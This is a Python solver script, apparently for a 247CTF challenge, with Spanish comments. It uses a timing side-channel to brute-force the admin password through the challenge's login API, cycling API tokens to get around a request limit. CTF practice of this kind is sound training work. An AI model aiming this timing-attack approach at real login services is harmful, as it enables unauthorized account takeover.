#!/usr/bin/env python3
import requests
import time

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    token = data["message"].split("reset to ")[1].rstrip("!")
    return token

def try_password(username, password, api_token):
    start = time.time()
    resp = requests.post(
        f"{BASE_URL}/api/login",
        data={
            "username": username,
            "password": password,
            "api": api_token
        },
        timeout=10
    )
    elapsed = time.time() - start
    return resp.json(), elapsed

# Voy a necesitar múltiples tokens ya que no tengo suficientes requests
# Estrategia: 4 tokens * 128 requests = 512 requests total
# Eso me da 1 request por carácter por posición

passwords_found = []

for token_num in range(4):
    api_token = get_token()
    request_count = 0
    
    start_pos = token_num * 8
    end_pos = min((token_num + 1) * 8, 32)
    
    known = "".join(passwords_found)
    
    for pos in range(start_pos, end_pos):
        timings = {}
        
        for char in HEX_CHARS:
            if request_count >= 120:  # Dejar margen
                break
                
            # Construir contraseña de prueba
            if pos < len(known):
                test_password = known + char + "0" * (31 - pos)
            else:
                test_password = known + char + "0" * (31 - pos)
            
            result, elapsed = try_password("admin", test_password, api_token)
            timings[char] = elapsed
            request_count += 1
            
            if result.get("result") == "success":
                print(f"{test_password}")
                exit(0)
        
        if timings:
            best_char = max(timings.items(), key=lambda x: x[1])[0]
            passwords_found.append(best_char)
            known = "".join(passwords_found)

print(f"{''.join(passwords_found)}")
